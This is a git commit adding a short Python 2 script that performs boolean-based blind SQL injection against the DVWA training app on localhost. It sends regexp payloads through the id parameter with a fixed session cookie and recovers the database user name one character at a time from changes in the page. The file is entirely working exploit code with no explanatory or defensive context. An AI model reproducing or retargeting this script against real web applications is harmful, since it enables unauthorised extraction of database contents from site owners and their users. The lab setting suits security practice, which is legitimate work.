a69d2ce3ba47ec80783e7e1d9ecb41fb64707524
Jumbo <jumbo.wjb@hackermail.com>
2019-02-28 19:17:44 +0800

    Create bool_sqli.py

---
+++ bool_sqli.py
@@ -0,0 +1,22 @@
+import requests
+
+
+def GetQ():
+    reuslt = []
+    pd = ''
+    payload = '0123456789abcdefghijklmnopqrstuvwxyz!_@%'
+    for i in range(30):
+        for p in payload:
+            url = "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20and%20user()%20regexp%20%27^{}%27 and 'a'like'a&Submit=Submit#".format(pd+p)
+            headers = {"Cookie":"security=low; PHPSESSID=65cba547699cda5ab206c6693735c8c6"}
+            get = requests.get(url,headers=headers)
+            if 'Surname' in get.content:
+                # print p
+                pd+=p
+                print pd
+
+
+
+
+
+GetQ()
